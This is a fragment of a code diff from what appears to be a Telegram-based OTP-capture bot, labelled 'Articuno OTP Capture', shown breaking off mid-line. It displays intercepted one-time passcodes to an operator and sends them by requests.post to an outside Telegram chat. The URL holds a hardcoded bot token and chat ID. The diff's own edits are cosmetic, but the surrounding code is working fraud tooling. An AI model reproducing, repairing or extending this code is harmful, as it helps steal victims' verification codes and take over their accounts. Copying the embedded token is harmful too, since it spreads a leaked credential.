@@ -1056,11 +1056,11 @@ def custom_prebuild_script_call(script_id,chatid):
             item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
-            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>*""",parse_mode='HTML',reply_markup=keyboard)
+            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
             try:
                  del accept_deny_handler[chatid]
             except:
-                 pass
+                 print("Error in deleting")
 
             requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
